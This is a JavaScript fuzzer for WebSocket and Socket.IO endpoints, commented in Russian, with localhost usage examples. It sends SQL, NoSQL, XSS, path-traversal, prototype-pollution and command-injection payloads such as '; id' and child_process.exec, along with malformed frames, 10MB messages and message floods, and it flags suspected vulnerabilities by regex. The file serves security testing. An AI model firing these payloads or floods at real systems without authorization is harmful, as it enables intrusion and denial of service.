

export class WebSocketFuzzer {
    constructor(url, options = {}) {
        this.url = url;
        this.type = options.type || 'websocket'; // 'websocket' или 'socketio'
        this.options = options;
        this.ws = null;
        this.results = [];
        this.isConnected = false;
        this.messageQueue = [];
        
        // Настройки
        this.timeout = options.timeout || 5000;
        this.maxMessageSize = options.maxMessageSize || 1024 * 1024; // 1MB
        this.reconnectAttempts = options.reconnectAttempts || 3;
        
        // События для Socket.IO
        this.socketioEvents = options.events || [
            'message', 'data', 'event', 'notification',
            'ping', 'pong', 'connect', 'disconnect',
            'subscribe', 'unsubscribe', 'join', 'leave',
            'create', 'update', 'delete', 'get',
            'auth', 'login', 'logout', 'register'
        ];
        
        // Универсальные фаззинг паттерны
        this.fuzzPatterns = {
            strings: [
                '',
                'A'.repeat(10000),
                'A'.repeat(100 * 1024),
                '\x00\x01\x02\x03\x04\x05',
                
                // SQL Injection
                'DROP TABLE users; --',
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1 --",
                
                // NoSQL Injection
                '{ "$ne": null }',
                '{ "$gt": "" }',
                '{ "$regex": ".*" }',
                '{ "$where": "return true" }',
                '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
                
                // XSS
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                
                // Path Traversal
                '../../../../etc/passwd',
                '..\\..\\..\\..\\windows\\win.ini',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                
                // Template Injection
                '${7*7}',
                '{{7*7}}',
                
                // Prototype Pollution
                '{"__proto__": {"polluted": true}}',
                '__proto__.polluted=true',
                'constructor.prototype.polluted=true',
                
                // Command Injection
                '; id',
                '| id',
                '`id`',
                '$(id)',
                'require("child_process").exec("id")',
                
                // WebSocket специфичные
                '\x81\xff\xff\xff\xff',  // Malformed frame
                '\x00\x00\x00\x00',       // Null frame
                '\xff\xff\xff\xff',       // Max frame
                'CLOSE', 'PING', 'PONG',
                'undefined', 'null', 'NaN', 'Infinity',
                
                // JSON специфичные
                '{"__proto__": {}}',
                '{ "constructor": { "prototype": { "polluted": true } } }',
                
                // Большие сообщения
                'A'.repeat(1024 * 1024),      // 1MB
                'A'.repeat(10 * 1024 * 1024), // 10MB
                
                // Binary данные как строка
                String.fromCharCode(0x00, 0x01, 0x02, 0x03),
                
                // WebSocket close codes
                '\x88\x00',  // Close frame
                '\x88\x02\x03\xe8',  // Close with code 1000
                '\x88\x02\x03\xf0',  // Close with code 1008
                
                // Control characters
                '\r\n', '\n', '\t', '\b', '\f',
                
                // Unicode атаки
                '😀'.repeat(1000),
                'नमस्ते'.repeat(100),
                '\u0000\u0001\u0002\u0003',
                '\u200B\u200C\u200D',
                
                // Экранирование
                '%00', '%0a', '%0d', '%25',
                '\\r\\n', '\\n', '\\t'
            ],
            
            numbers: [
                0, -1, 1,
                2147483647, -2147483648,
                4294967295,
                9223372036854775807, -9223372036854775808,
                1.5, 2.7, 3.14,
                1e308, -1e308,
                1e-324,
                NaN, Infinity, -Infinity,
                '123', '0xFF', '0b1010',
                'not_a_number',
                null
            ],
            
            booleans: [true, false, null, 1, 0, 'true', 'false', 'yes', 'no'],
            
            arrays: [
                [],
                [null],
                [''],
                [1, 'two', true],
                Array(1000).fill('x'),
                [1, [2, [3, [4, [5]]]]],
                ['admin', { $ne: null }],
                [{ $gt: '' }, { $lt: '' }]
            ],
            
            objects: [
                {},
                { '__proto__': { 'polluted': true } },
                { 'constructor': { 'prototype': { 'polluted': true } } },
                { $ne: null },
                { $gt: '' },
                { $regex: '.*' },
                { $where: 'function() { return true; }' },
                { username: { $ne: null } },
                { password: { $regex: '.*' } },
                { username: 'admin', password: { $ne: null } }
            ],
            
            binary: [
                Buffer.from(''),
                Buffer.from([0x00, 0x01, 0x02, 0x03]),
                Buffer.from('A'.repeat(10000)),
                Buffer.from([0xFF, 0xFE, 0xFD, 0xFC]),
                Buffer.alloc(1024 * 1024, 0x41),  // 1MB
                Buffer.alloc(10 * 1024 * 1024, 0x41)  // 10MB
            ],
            
            nullValues: [null, undefined]
        };
        
        // Стратегии мутации
        this.mutationStrategies = {
            typeConfusion: this.typeConfusion.bind(this),
            boundaryValues: this.boundaryValues.bind(this),
            deepNesting: this.deepNesting.bind(this),
            unicodeInjection: this.unicodeInjection.bind(this),
            malformedFrame: this.malformedFrame.bind(this),
            fragmentationAttack: this.fragmentationAttack.bind(this),
            slowlorisAttack: this.slowlorisAttack.bind(this),
            messageFlood: this.messageFlood.bind(this),
            largeMessage: this.largeMessage.bind(this),
            invalidJSON: this.invalidJSON.bind(this)
        };
    }
    
    // ========== СТРАТЕГИИ МУТАЦИИ ==========
    
    typeConfusion(data) {
        if (typeof data === 'string') {
            return Math.random() > 0.5 ? (parseInt(data) || 0) : { value: data };
        }
        if (typeof data === 'number') return data.toString();
        if (typeof data === 'boolean') return data ? 'true' : 'false';
        if (data === null) return [];
        if (typeof data === 'object') return JSON.stringify(data);
        return data;
    }
    
    boundaryValues(data) {
        const boundaries = ['', 0, -1, 2147483647, -2147483648, null, [], {}];
        return boundaries[Math.floor(Math.random() * boundaries.length)];
    }
    
    deepNesting(data, depth = 20) {
        const createDeep = (d) => {
            if (d <= 0) return 'value';
            return { next: createDeep(d - 1) };
        };
        return createDeep(depth);
    }
    
    unicodeInjection(data) {
        const unicodeChars = ['\u0000', '\u0001', '\u200B', '\u200C', '\u200D', '\uFEFF', '\u202E', '\u202D'];
        if (typeof data === 'string') {
            const char = unicodeChars[Math.floor(Math.random() * unicodeChars.length)];
            return char + data + char;
        }
        return data;
    }
    
    malformedFrame() {
        // WebSocket специфичные малформированные фреймы
        const frames = [
            '\x81\xff\xff\xff\xff',  // Неверная длина
            '\x80\x00',               // Пустой фрейм
            '\x88\x00',               // Close без кода
            '\x89\x00',               // Ping без данных
            '\x8a\x00',               // Pong без данных
            '\x81\xfe\x00\x01',       // 16-bit длина
            '\x81\xff\x00\x00\x00\x00\x00\x00\x00\x01', // 64-bit длина
            '\x00\x00',               // Некорректный opcode
            '\xff\xff',               // Max opcode
            '\x81\x01\x00'            // Неполный фрейм
        ];
        return frames[Math.floor(Math.random() * frames.length)];
    }
    
    fragmentationAttack() {
        // Атака фрагментацией - разбиваем сообщение на много фрагментов
        const fragments = [];
        const message = 'A'.repeat(10000);
        const fragmentSize = 10;
        
        for (let i = 0; i < message.length; i += fragmentSize) {
            const isLast = i + fragmentSize >= message.length;
            const fragment = message.slice(i, i + fragmentSize);
            fragments.push(fragment);
        }
        
        return fragments;
    }
    
    slowlorisAttack() {
        // Медленная отправка сообщений
        return {
            strategy: 'slowloris',
            delay: 100,  // ms между частями
            chunks: ['H', 'e', 'l', 'l', 'o']
        };
    }
    
    messageFlood() {
        // Флуд сообщениями
        const messages = [];
        for (let i = 0; i < 1000; i++) {
            messages.push({
                type: 'flood',
                index: i,
                data: this.randomItem(this.fuzzPatterns.strings)
            });
        }
        return messages;
    }
    
    largeMessage() {
        // Очень большие сообщения
        return {
            type: 'large',
            size: 10 * 1024 * 1024,  // 10MB
            data: 'A'.repeat(10 * 1024 * 1024)
        };
    }
    
    invalidJSON() {
        // Некорректный JSON
        const invalid = [
            '{',
            '}',
            '{ "key": }',
            '{ "key": "value"',
            '{"key": "value"}}',
            '{ key: "value" }',
            'undefined',
            'NaN',
            'function() { return true; }',
            'null null',
            '123 456',
            'true false'
        ];
        return this.randomItem(invalid);
    }
    
    // ========== WEBSOCKET СОЕДИНЕНИЕ ==========
    
    async connect() {
        return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Connection timeout'));
            }, this.timeout);
            
            try {
                if (this.type === 'socketio') {
                    // Socket.IO подключение
                    this.initSocketIO();
                } else {
                    // Обычный WebSocket
                    this.ws = new WebSocket(this.url);
                    
                    this.ws.onopen = () => {
                        clearTimeout(timeout);
                        this.isConnected = true;
                        console.log('✓ WebSocket подключен');
                        resolve();
                    };
                    
                    this.ws.onerror = (error) => {
                        clearTimeout(timeout);
                        reject(error);
                    };
                    
                    this.ws.onmessage = (event) => {
                        this.handleMessage(event.data);
                    };
                    
                    this.ws.onclose = () => {
                        this.isConnected = false;
                        console.log('⚠️ WebSocket отключен');
                    };
                }
            } catch (error) {
                clearTimeout(timeout);
                reject(error);
            }
        });
    }
    
    initSocketIO() {
        // Для Socket.IO нужно подключить библиотеку
        // Это пример, требует socket.io-client
        if (typeof io !== 'undefined') {
            this.ws = io(this.url, this.options.socketioOptions || {});
            
            this.ws.on('connect', () => {
                this.isConnected = true;
                console.log('✓ Socket.IO подключен');
                if (this.onConnect) this.onConnect();
            });
            
            this.ws.on('disconnect', () => {
                this.isConnected = false;
                console.log('⚠️ Socket.IO отключен');
            });
            
            this.ws.on('error', (error) => {
                console.error('Socket.IO ошибка:', error);
            });
            
            // Подписываемся на все события
            for (const event of this.socketioEvents) {
                this.ws.on(event, (data) => {
                    this.handleMessage({ event, data });
                });
            }
        } else {
            throw new Error('Socket.IO client library not loaded');
        }
    }
    
    async disconnect() {
        if (this.ws) {
            if (this.type === 'socketio') {
                this.ws.disconnect();
            } else {
                this.ws.close();
            }
            this.isConnected = false;
            await new Promise(r => setTimeout(r, 500));
        }
    }
    
    // ========== ОТПРАВКА СООБЩЕНИЙ ==========
    
    async send(data, event = null) {
        if (!this.isConnected) {
            throw new Error('Not connected');
        }
        
        return new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Send timeout'));
            }, this.timeout);
            
            try {
                let message = data;
                
                // Конвертируем в строку если нужно
                if (typeof data === 'object' && data !== null && !Buffer.isBuffer(data)) {
                    message = JSON.stringify(data);
                } else if (Buffer.isBuffer(data)) {
                    message = data;
                }
                
                if (this.type === 'socketio' && event) {
                    this.ws.emit(event, message, (response) => {
                        clearTimeout(timeout);
                        resolve(response);
                    });
                } else {
                    this.ws.send(message);
                    clearTimeout(timeout);
                    resolve({ sent: true });
                }
            } catch (error) {
                clearTimeout(timeout);
                reject(error);
            }
        });
    }
    
    handleMessage(data) {
        const timestamp = Date.now();
        let parsedData = data;
        
        // Пытаемся распарсить JSON
        if (typeof data === 'string') {
            try {
                parsedData = JSON.parse(data);
            } catch (e) {
                // Не JSON
            }
        }
        
        this.messageQueue.push({
            timestamp,
            data: parsedData,
            raw: data
        });
        
        // Ограничиваем очередь
        if (this.messageQueue.length > 1000) {
            this.messageQueue.shift();
        }
    }
    
    // ========== ДЕТЕКЦИЯ УЯЗВИМОСТЕЙ ==========
    
    detectVulnerabilities(message, response, context) {
        const vulnerabilities = [];
        const messageStr = JSON.stringify(message || '').toLowerCase();
        const responseStr = JSON.stringify(response || '').toLowerCase();
        const fullText = messageStr + responseStr;
        
        // 1. XSS через WebSocket
        if (/<script|javascript:|onerror=|onload=/.test(fullText)) {
            vulnerabilities.push({
                type: 'XSS_WEBSOCKET',
                severity: 'HIGH',
                description: 'XSS инъекция через WebSocket сообщение',
                message: messageStr.substring(0, 200)
            });
        }
        
        // 2. SQL инъекция
        if (/sql|mysql|postgres|syntax error/.test(fullText)) {
            vulnerabilities.push({
                type: 'SQL_INJECTION',
                severity: 'CRITICAL',
                description: 'SQL ошибка через WebSocket'
            });
        }
        
        // 3. NoSQL инъекция
        if (/\$ne|\$gt|\$regex|\$where/.test(fullText)) {
            vulnerabilities.push({
                type: 'NOSQL_INJECTION',
                severity: 'CRITICAL',
                description: 'NoSQL оператор найден в сообщении'
            });
        }
        
        // 4. Prototype pollution
        if (/__proto__|constructor\[prototype\]/.test(fullText)) {
            vulnerabilities.push({
                type: 'PROTOTYPE_POLLUTION',
                severity: 'HIGH',
                description: 'Prototype pollution через WebSocket'
            });
        }
        
        // 5. Command injection
        if (/; id|\| id|`id`|\$\(id\)/.test(fullText)) {
            vulnerabilities.push({
                type: 'COMMAND_INJECTION',
                severity: 'CRITICAL',
                description: 'Command injection через WebSocket'
            });
        }
        
        // 6. Path traversal
        if (/\.\.\/\.\.\/\.\.\/etc\/passwd/.test(fullText)) {
            vulnerabilities.push({
                type: 'PATH_TRAVERSAL',
                severity: 'HIGH',
                description: 'Path traversal через WebSocket'
            });
        }
        
        // 7. Инъекция в события Socket.IO
        if (context?.event && this.socketioEvents.includes(context.event)) {
            if (messageStr.includes('$') || messageStr.includes('{') || messageStr.includes('}')) {
                vulnerabilities.push({
                    type: 'SOCKETIO_EVENT_INJECTION',
                    severity: 'MEDIUM',
                    description: `Возможная инъекция в событие ${context.event}`
                });
            }
        }
        
        // 8. Утечка данных
        if (responseStr.includes('password') || 
            responseStr.includes('secret') || 
            responseStr.includes('token')) {
            vulnerabilities.push({
                type: 'DATA_LEAK',
                severity: 'HIGH',
                description: 'Утечка чувствительных данных'
            });
        }
        
        // 9. DoS через большие сообщения
        if (messageStr.length > 1024 * 1024) {
            vulnerabilities.push({
                type: 'DOS_LARGE_MESSAGE',
                severity: 'MEDIUM',
                description: `Большое сообщение (${messageStr.length} байт)`
            });
        }
        
        return vulnerabilities;
    }
    
    // ========== ФАЗЗИНГ ==========
    
    async fuzzWebSocket(iterations = 100) {
        console.log('\n🔍 ФАЗЗИНГ WEBSOCKET');
        console.log('='.repeat(50));
        
        // Тест 1: Разные типы данных
        console.log('\n📦 Тест 1: Разные типы данных');
        const dataTypes = [
            'string', 'number', 'boolean', 'array', 'object', 'null', 'binary'
        ];
        
        for (const type of dataTypes) {
            const data = this.generateValueByType(type);
            console.log(`   Отправка ${type}: ${JSON.stringify(data).substring(0, 50)}...`);
            
            try {
                await this.send(data);
                await new Promise(r => setTimeout(r, 100));
            } catch (error) {
                console.log(`   ✗ Ошибка: ${error.message}`);
                this.results.push({
                    type: 'SEND_ERROR',
                    severity: 'MEDIUM',
                    description: `Ошибка при отправке ${type}`,
                    error: error.message
                });
            }
        }
        
        // Тест 2: NoSQL инъекции
        console.log('\n🔐 Тест 2: NoSQL инъекции');
        for (const nosql of this.fuzzPatterns.objects.slice(0, 20)) {
            console.log(`   Отправка: ${JSON.stringify(nosql).substring(0, 80)}...`);
            
            try {
                await this.send(nosql);
                await new Promise(r => setTimeout(r, 100));
                
                // Проверяем ответы
                for (const response of this.messageQueue.slice(-5)) {
                    const vulns = this.detectVulnerabilities(nosql, response.data, { type: 'nosql' });
                    if (vulns.length) {
                        this.results.push(...vulns);
                        vulns.forEach(v => console.log(`   🔴 [${v.severity}] ${v.type}`));
                    }
                }
            } catch (error) {
                console.log(`   ✗ Ошибка: ${error.message}`);
            }
        }
        
        // Тест 3: XSS и HTML инъекции
        console.log('\n🌐 Тест 3: XSS инъекции');
        const xssPayloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>'
        ];
        
        for (const payload of xssPayloads) {
            console.log(`   Отправка: ${payload.substring(0, 50)}...`);
            await this.send(payload);
            await new Promise(r => setTimeout(r, 100));
        }
        
        // Тест 4: Malformed WebSocket frames
        console.log('\n🔧 Тест 4: Malformed frames');
        for (let i = 0; i < 10; i++) {
            const frame = this.mutationStrategies.malformedFrame();
            console.log(`   Отправка malformed frame: ${Buffer.from(frame).toString('hex')}...`);
            
            try {
                if (this.ws && this.ws.send) {
                    this.ws.send(frame);
                }
                await new Promise(r => setTimeout(r, 100));
            } catch (error) {
                console.log(`   ✗ Ошибка: ${error.message}`);
            }
        }
        
        // Тест 5: Большие сообщения (DoS)
        console.log('\n💣 Тест 5: Большие сообщения (DoS)');
        const sizes = [1024, 10240, 102400, 1024 * 1024, 5 * 1024 * 1024];
        
        for (const size of sizes) {
            const largeData = 'A'.repeat(size);
            console.log(`   Отправка ${size} байт...`);
            
            const startTime = Date.now();
            try {
                await this.send(largeData);
                const duration = Date.now() - startTime;
                
                if (duration > 1000) {
                    console.log(`   ⚠️ Медленная отправка: ${duration}ms`);
                    this.results.push({
                        type: 'SLOW_WEBSOCKET',
                        severity: 'LOW',
                        description: `Отправка ${size} байт заняла ${duration}ms`
                    });
                }
            } catch (error) {
                console.log(`   ✗ Ошибка: ${error.message}`);
                this.results.push({
                    type: 'DOS_WEBSOCKET',
                    severity: 'HIGH',
                    description: `WebSocket упал при отправке ${size} байт`,
                    error: error.message
                });
            }
            
            await new Promise(r => setTimeout(r, 500));
        }
        
        // Тест 6: Message flood
        console.log('\n🌊 Тест 6: Message flood');
        const floodMessages = 100;
        const startTime = Date.now();
        
        for (let i = 0; i < floodMessages; i++) {
            await this.send(`Message ${i}: ${this.randomItem(this.fuzzPatterns.strings)}`);
        }
        
        const totalTime = Date.now() - startTime;
        console.log(`   Отправлено ${floodMessages} сообщений за ${totalTime}ms`);
        
        if (totalTime > 10000) {
            this.results.push({
                type: 'SLOW_MESSAGE_FLOOD',
                severity: 'MEDIUM',
                description: `${floodMessages} сообщений заняли ${totalTime}ms`
            });
        }
        
        // Тест 7: Socket.IO специфичные тесты
        if (this.type === 'socketio') {
            console.log('\n🎮 Тест 7: Socket.IO специфичные тесты');
            
            for (const event of this.socketioEvents) {
                const payload = this.randomItem(this.fuzzPatterns.objects);
                console.log(`   Событие ${event}: ${JSON.stringify(payload).substring(0, 50)}...`);
                
                try {
                    await this.send(payload, event);
                    await new Promise(r => setTimeout(r, 100));
                } catch (error) {
                    console.log(`   ✗ Ошибка: ${error.message}`);
                }
            }
        }
    }
    
    generateValueByType(type) {
        switch(type) {
            case 'string': return this.randomItem(this.fuzzPatterns.strings);
            case 'number': return this.randomItem(this.fuzzPatterns.numbers);
            case 'boolean': return this.randomItem(this.fuzzPatterns.booleans);
            case 'array': return this.randomItem(this.fuzzPatterns.arrays);
            case 'object': return this.randomItem(this.fuzzPatterns.objects);
            case 'null': return this.randomItem(this.fuzzPatterns.nullValues);
            case 'binary': return this.randomItem(this.fuzzPatterns.binary);
            default: return null;
        }
    }
    
    randomItem(arr) {
        if (!arr || arr.length === 0) return null;
        return arr[Math.floor(Math.random() * arr.length)];
    }
    
    // ========== ОСНОВНОЙ ЗАПУСК ==========
    
    async run() {
        console.log('\n🔍 НАЧАЛО ФАЗЗИНГА WEBSOCKET');
        console.log(`📍 URL: ${this.url}`);
        console.log(`📡 Тип: ${this.type}\n`);
        
        try {
            await this.connect();
            
            await this.fuzzWebSocket(100);
            
            this.printReport();
            
            await this.disconnect();
            
            return this.results;
        } catch (error) {
            console.error(`✗ Ошибка: ${error.message}`);
            return this.results;
        }
    }
    
    printReport() {
        console.log('\n' + '='.repeat(70));
        console.log('📊 ОТЧЕТ О ФАЗЗИНГЕ WEBSOCKET');
        console.log('='.repeat(70));
        
        const critical = this.results.filter(r => r.severity === 'CRITICAL');
        const high = this.results.filter(r => r.severity === 'HIGH');
        const medium = this.results.filter(r => r.severity === 'MEDIUM');
        const low = this.results.filter(r => r.severity === 'LOW');
        
        console.log(`\n🔴 CRITICAL: ${critical.length}`);
        console.log(`🟠 HIGH: ${high.length}`);
        console.log(`🟡 MEDIUM: ${medium.length}`);
        console.log(`🟢 LOW: ${low.length}`);
        
        if (this.results.length > 0) {
            console.log('\n📋 ДЕТАЛИ УЯЗВИМОСТЕЙ:');
            
            const allVulns = [...critical, ...high, ...medium, ...low];
            allVulns.forEach((v, i) => {
                console.log(`\n${i + 1}. [${v.severity}] ${v.type}`);
                console.log(`   Описание: ${v.description}`);
                if (v.message) console.log(`   Сообщение: ${v.message.substring(0, 200)}`);
                if (v.error) console.log(`   Ошибка: ${v.error}`);
            });
        } else {
            console.log('\n✅ Уязвимостей не обнаружено');
        }
        
        console.log('\n' + '='.repeat(70));
    }
    
    exportResults(format = 'json') {
        const report = {
            url: this.url,
            type: this.type,
            timestamp: new Date().toISOString(),
            totalVulnerabilities: this.results.length,
            vulnerabilities: this.results,
            summary: {
                critical: this.results.filter(r => r.severity === 'CRITICAL').length,
                high: this.results.filter(r => r.severity === 'HIGH').length,
                medium: this.results.filter(r => r.severity === 'MEDIUM').length,
                low: this.results.filter(r => r.severity === 'LOW').length
            }
        };
        
        if (format === 'json') {
            return JSON.stringify(report, null, 2);
        } else if (format === 'csv') {
            const headers = ['type', 'severity', 'description', 'timestamp'];
            const rows = this.results.map(r => 
                [r.type, r.severity, r.description || '', r.timestamp || new Date().toISOString()]
                    .map(cell => `"${cell}"`).join(',')
            );
            return [headers.join(','), ...rows].join('\n');
        }
        
        return report;
    }
}

// ========== ПРИМЕР ИСПОЛЬЗОВАНИЯ ==========
export async function main() {
    // Пример для WebSocket
    const wsFuzzer = new WebSocketFuzzer('ws://localhost:8080', {
        type: 'websocket',
        timeout: 5000,
        maxMessageSize: 10 * 1024 * 1024
    });
    
    await wsFuzzer.run();
    
    // Пример для Socket.IO
    const ioFuzzer = new WebSocketFuzzer('http://localhost:3000', {
        type: 'socketio',
        events: ['message', 'chat', 'event', 'data'],
        socketioOptions: {
            transports: ['websocket'],
            reconnection: false
        }
    });
    
    await ioFuzzer.run();
    
    // Экспорт результатов
    const fs = await import('fs/promises');
    await fs.writeFile('./websocket-fuzzer-report.json', wsFuzzer.exportResults('json'));
    
    console.log('\n💾 Отчет сохранен: websocket-fuzzer-report.json');
}

// Запуск (раскомментировать для использования)
// main();
/*
import { WebSocketFuzzer } from './websocket-fuzzer.js';

// WebSocket
const fuzzer = new WebSocketFuzzer('ws://localhost:8080', {
    type: 'websocket',
    timeout: 5000
});
await fuzzer.run();

// Socket.IO
const ioFuzzer = new WebSocketFuzzer('http://localhost:3000', {
    type: 'socketio',
    events: ['chat', 'message', 'event']
});
await ioFuzzer.run();
*/